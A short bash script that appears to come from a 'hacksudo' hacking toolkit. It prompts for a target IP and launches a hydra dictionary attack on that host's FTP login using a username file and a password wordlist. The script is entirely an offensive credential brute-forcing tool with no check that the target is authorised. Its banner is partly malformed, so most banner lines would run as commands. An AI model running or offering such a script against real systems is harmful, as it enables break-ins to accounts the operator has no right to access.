#!/bin/bash
echo "_                _                  _       "
"| |__   __ _  ___| | _____ _   _  __| | ___  "
"| '_ \ / _` |/ __| |/ / __| | | |/ _` |/ _ \ "
"| | | | (_| | (__|   <\__ \ |_| | (_| | (_) |"
"|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/ "
"www.hacksudo.com"
echo "enter your target ip:"
read ans
export user=user.txt
export pass=dict.lst
hydra -L $user -P $pass $ans ftp
